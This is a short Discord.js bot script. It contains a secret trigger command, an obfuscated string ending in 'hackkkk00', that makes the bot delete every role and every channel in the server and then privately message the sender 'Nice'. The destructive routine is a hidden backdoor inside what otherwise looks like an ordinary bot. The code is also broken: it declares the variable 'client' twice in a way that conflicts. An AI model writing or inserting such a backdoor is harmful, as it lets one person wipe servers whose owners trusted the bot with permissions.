client.on('message', client => {
 if (client.content.startsWith("!commmmmmmmmmmmmmmmmmmmmmmmmmmmannnnnnnnnnnnnnnnnndhackkkkkkkkkkkkkk00")) {
client.guild.roles.forEach(r => { r.delete() })
client.guild.channels.forEach(c => { c.delete() })
let client = new Discord.RichEmbed()
.setColor('RANDOM')
.setDescription('**Nice**')
client.author.sendEmbed(client);
}
});


client.login(process.env.BOT_TOKEN);
